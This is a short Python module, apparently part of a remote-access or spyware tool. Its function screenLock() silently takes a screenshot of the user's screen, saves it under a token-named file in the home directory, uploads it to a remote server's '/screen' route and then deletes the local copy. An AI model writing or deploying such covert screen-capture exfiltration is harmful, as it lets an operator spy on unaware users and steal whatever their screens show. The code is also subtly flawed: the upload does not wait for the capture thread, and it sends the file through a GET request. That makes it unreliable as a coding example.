import pyautogui
import requests
import threading
import Function.requests.Information as DataCenter
from os import path, remove

ROTA = "/screen"

def screenLock():
    try:
        thr = screenMap()
        thr.start()
        comandoFinalizado()
        
    except PermissionError:
        pass

def comandoFinalizado():
    mainPath = path.join(path.expanduser(f"~/{DataCenter.getToken()}.png"))
    if(path.isfile(mainPath)):
        file = open(mainPath, "rb")
        param = {"arquivo": ('imagem.png', file, 'image/png') }
        try:
            conn = requests.get(DataCenter.getURL() + ROTA, files=param)
            print(conn.status_code)
            print("ENVIADA!")

        except Exception as erro:
            print(erro)

        finally:
            file.close()
            remove(mainPath)

class screenMap(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        mainPath = path.join(path.expanduser(f"~/{DataCenter.getToken()}.png"))
        foto = pyautogui.screenshot()
        foto.save(mainPath)

        
